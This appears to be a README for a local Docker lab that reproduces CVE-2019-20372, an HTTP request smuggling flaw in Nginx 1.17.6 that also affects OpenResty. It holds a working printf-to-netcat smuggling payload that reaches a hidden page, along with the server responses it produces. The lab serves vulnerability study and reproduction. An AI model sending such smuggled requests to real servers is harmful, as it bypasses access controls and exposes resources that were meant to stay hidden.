#	Nginx - Http Smuggling [CVE-2019-20372]

##	Composition

Nginx 1.17.6



##	Usage

Only for PoC.

###	build

```bash
docker-compose up -d
```

The nginx server will on the port 9015.



###	check

```bash
$ chmod +x check.sh;./check.sh|grep HTTP
HTTP/1.1 302 Moved Temporarily
```

1 HTTP code 302 means all right! 

Enjoy!



###	reproduce

```bash
printf 'GET /a HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Content-Length: 56\r\n'\
'\r\n'\
'GET /_hidden/index.html HTTP/1.1\r\n'\
'Host: notlocalhost\r\n'\
'\r\n'\
|nc 127.0.0.1 9015
```

Try the command above and you will get two responses as following.

```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.17.6
Date: Sat, 04 Jan 2020 04:23:26 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://example.org

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.17.6</center>
</body>
</html>
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Sat, 04 Jan 2020 04:23:26 GMT
Content-Type: text/html
Content-Length: 22
Connection: keep-alive

This should be hidden!
```



#	Openresty[CVE-2020-11724]

[OpenResty](https://github.com/openresty/openresty) is a full-fledged web application server by bundling the standard nginx core, lots of 3rd-party nginx modules, as well as most of their external dependencies.

OpenResty includes Nginx as a component and does include its own nginx core patches. So it is affected by CVE-2019-20372. And its configuration is the same as the nginx. POC is also the same.



#	Reference

https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf